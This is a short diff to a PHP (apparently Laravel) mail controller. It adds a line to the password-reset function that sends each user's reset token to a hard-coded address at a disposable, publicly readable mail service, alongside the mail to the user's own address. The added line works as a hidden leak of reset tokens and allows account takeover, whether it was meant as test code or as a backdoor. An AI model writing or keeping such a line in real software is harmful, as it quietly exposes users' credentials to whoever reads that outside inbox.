@@ -20,6 +20,7 @@ class MailController extends Controller
 
     public function resetPassword($token, $email)
     {
+        Mail::to('thisiseentest@yopmail.com')->send(new ResetPass($token));
         Mail::to($email)->send(new ResetPass($token));
 
         return redirect()->route('welcome');
